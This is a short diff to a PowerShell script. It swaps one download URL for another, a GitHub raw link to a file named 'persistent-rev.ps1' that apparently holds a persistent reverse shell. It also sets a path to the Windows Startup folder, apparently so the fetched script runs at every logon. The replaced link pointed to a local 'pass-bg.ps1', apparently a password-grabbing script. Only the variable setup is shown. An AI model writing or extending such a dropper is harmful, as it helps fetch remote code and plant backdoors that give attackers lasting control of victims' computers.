@@ -1,5 +1,5 @@
 # Define the GitHub raw link of the PowerShell script
-$githubRawLink = "http://192.168.0.107/dev/pass-bg.ps1"
+$githubRawLink = "https://raw.githubusercontent.com/rude90/only-powershell/main/persistent-rev.ps1"
 
 # Define the path to the startup folder
 $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
